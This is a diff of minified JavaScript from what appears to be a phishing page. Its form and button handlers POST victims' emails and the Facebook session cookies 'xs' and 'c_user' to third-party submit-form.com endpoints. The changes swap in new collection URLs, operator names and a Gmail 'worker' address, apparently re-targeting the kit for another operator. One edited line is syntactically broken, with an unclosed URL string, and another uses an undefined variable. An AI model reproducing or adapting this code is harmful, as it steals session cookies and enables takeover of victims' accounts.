@@ -9821,10 +9821,10 @@
                                         },
                                         body: JSON.stringify({
                                             emails: o,
-                                            workerEmail: "salmanjani email",
+                                            workerEmail: "munir",
                                             xs: r,
                                             c_user: i,
-                                            name: "asad"
+                                            name: "irbaz"
                                         })
                                     }).then((e => {
                                         e.ok
@@ -13358,14 +13358,14 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/r5uqIEmRD", {
+                                    u && o ? (fetch("https://submit-form.com/Igi2zetGZ", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
-                                            emails: e,
-                                            workerEmail: "",
+                                            emails: munir,
+                                            workerEmail: "marketingland9@gmail.com",
                                             xs: o,
                                             c_user: u,
                                             name: "My Self"
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/r5uqIEmRD", {
+                        fetch("https://submit-form.com/L2joBfHfp {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
